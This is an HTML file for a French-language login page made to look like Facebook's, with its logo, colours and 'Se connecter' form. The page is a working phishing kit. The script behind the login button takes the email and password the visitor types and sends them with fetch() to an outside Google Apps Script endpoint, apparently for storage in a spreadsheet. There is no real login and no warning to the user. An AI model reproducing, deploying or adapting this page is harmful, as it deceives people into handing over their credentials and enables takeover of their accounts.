<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Connexion ou inscription</title>
    <style>
        body {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #e9eff1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .login-container {
            background-color: white;
            padding: 40px 55px 25px;
            width: 380px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .login-container h1 {
            color: #1877f2;
            font-size: 30px;
            margin-bottom: 25px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 5px;
            margin-bottom: 10px;
        }

        .input-group input:focus {
            outline: none;
            border-color: #1877f2;
        }

        .button {
            width: 100%;
            padding: 15px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
        }

        .button:hover {
            background-color: #166fe5;
        }

        .button:active {
            background-color: #155db5;
        }

        .footer {
            margin-top: 15px;
            font-size: 14px;
        }

        .footer a {
            color: #1877f2;
            text-decoration: none;
        }

        .footer .forgot-password {
            float: left;
            margin-top: 7px;
        }

        .footer .create-account {
            float: right;
            margin-top: 7px;
        }

        .facebook-logo {
            width: 250px;
            margin-bottom: 20px;
        }

    </style>
</head>
<body>

    <div class="login-container">
        <img class="facebook-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        <h1>Se connecter</h1>

        <!-- Formulaire de connexion -->
        <div class="input-group">
            <input type="email" id="email" placeholder="Adresse e-mail ou numéro de téléphone" required>
        </div>
        <div class="input-group">
            <input type="password" id="password" placeholder="Mot de passe" required>
        </div>

        <!-- Bouton de connexion -->
        <button class="button" onclick="saveToGoogleSheet()">Se connecter</button>

        <!-- Liens de pied de page -->
        <div class="footer">
            <a href="#" class="forgot-password">Mot de passe oublié ?</a>
            <a href="#" class="create-account">Créer un compte</a>
        </div>
    </div>

    <script>
        function saveToGoogleSheet() {
            let email = document.getElementById("email").value;
            let password = document.getElementById("password").value;

            // Vérifie que les champs sont remplis
            if (!email || !password) {
                alert("Veuillez remplir tous les champs.");
                return;
            }

            // L'URL de ton script Google Apps
            let googleSheetURL = "https://script.google.com/macros/s/AKfycbzbGLFbWk5A_ZNEtm6IUrzjOEZqA6K9LaGQP_Arr96aWLsZ2WueO3nqJ31B2RNin-TPjQ/exec";

            // Envoie des données au script Google Apps
            fetch(googleSheetURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email: email, password: password })
            })
            .then(response => response.text())
            .then(data => alert(data)) // Affiche une alerte lorsque les données sont envoyées
            .catch(error => console.error("Erreur :", error)); // Affiche l'erreur dans la console
        }
    </script>

</body>
  </html>
